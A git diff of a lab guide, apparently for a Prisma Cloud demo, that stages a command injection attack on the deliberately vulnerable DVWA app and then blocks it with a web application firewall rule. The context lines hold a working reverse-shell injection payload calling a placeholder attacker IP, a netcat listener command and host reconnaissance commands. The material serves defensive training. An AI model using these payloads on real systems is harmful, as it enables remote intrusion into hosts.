@@ -26,7 +26,7 @@ Requirements:
 
 ### (Option 1) Locally from vm to laptop terminal ---easiest/recommended way
 
-* To run the attack, open a terminal window on your local machine. Explain this is the attackers terminal. In terminal enter (linux devices) `nc -lvp 5678` (macOS) `netcat -lvp 5678`. This will open a listening port on port 5678. Nothing too exiting to see yet. 
+* To run the attack, open a terminal window on your local (not the VM) machine. Explain this is the attackers terminal. In terminal enter (linux devices) `nc -lvp 5678` (macOS) `netcat -lvp 5678`. This will open a listening port on port 5678. Nothing too exiting to see yet. 
 * Then retrieve the Internal IP address of the local machine.
 * Go back to the DVWA app and enter this command on the command injection screen. `127.0.0.1 & bash -c 'bash -i >& /dev/tcp/<YOUR_INTERNAL_IP_ADDRESS>/5678 0>&1'`
 * Check the terminal window where you entered `nc -lvp 5678` you should now have a reverse shell into the container. 
@@ -52,7 +52,7 @@ Requirements:
 * `uname -a` provides the processor architecture, the system hostname and the version of the kernel running on the host machine. If you're able to determine that it's an vulnerable/unpatched kernel this information can be used to gain further access and information. 
 * `cat /proc/cmdline` shows the kernel parameters passed during boot
 * `cat /proc/cpuinfo` shows the type of processor the host machine is running, including the amount of CPUs present
-* `cat /proc/version` provides inforation which pertains to the version of Linux kernel used in the host machine machines distro. 
+* `cat /proc/version` provides information which pertains to the version of Linux kernel used in the host machine machines distro. 
 * Link to linux kernel vulnerabilities from the CVE database [here](https://www.cvedetails.com/vulnerability-list/vendor_id-33/product_id-47/cvssscoremin-7/cvssscoremax-7.99/Linux-Linux-Kernel.html)
 
 ### See how Prisma Cloud Defenders responded to the incident. 
@@ -75,11 +75,13 @@ In the Prisma Compute Console:
 * Step 2: Click ‘Add Rule’
 * Step 3: Rule Name: Command Injection Defense
 * Step 4: Then click scope
-* Step 5: Add all images that have dvwa in them
+* Step 5a: Check boxes of all images that have dvwa in them.
+* Step 5b: If there are none, click 'Add Collection', type in a name, type in 'dvwa' in the image field, select the image(s), and click 'Save'
+* Step 5c: Ensure you have the 'dvwa' boxes checked and click 'Select collections'
 * Step 6: Click ‘Add New App’
 * Step 7: On the next pop-up click the ‘+ Add Endpoint’ 
-* Step 8: Enter 80 for internal port then hit ‘Create Endpoint’ 
-* Step 9: Click the ‘App Firewall' tab and under command injection set it to block. 
+* Step 8: Enter 80 for App port (internal port) then hit ‘Create’ 
+* Step 9: Click the ‘App Firewall' tab and under OS Command Injection set it to Prevent. 
 * Step 10: Click ‘Save’
 
 
@@ -87,3 +89,4 @@ In the Prisma Compute Console:
 
 * Log out of the dvwa app and close your reverse shell session by typing `exit` in the "attackers" shell. 
 * Attempt to do the attack again on the web app and you should see a blocked warning. Note that the IP address of the attacker is logged. 
+* The event can be viewed under Monitor > Events > WAAS for containers.
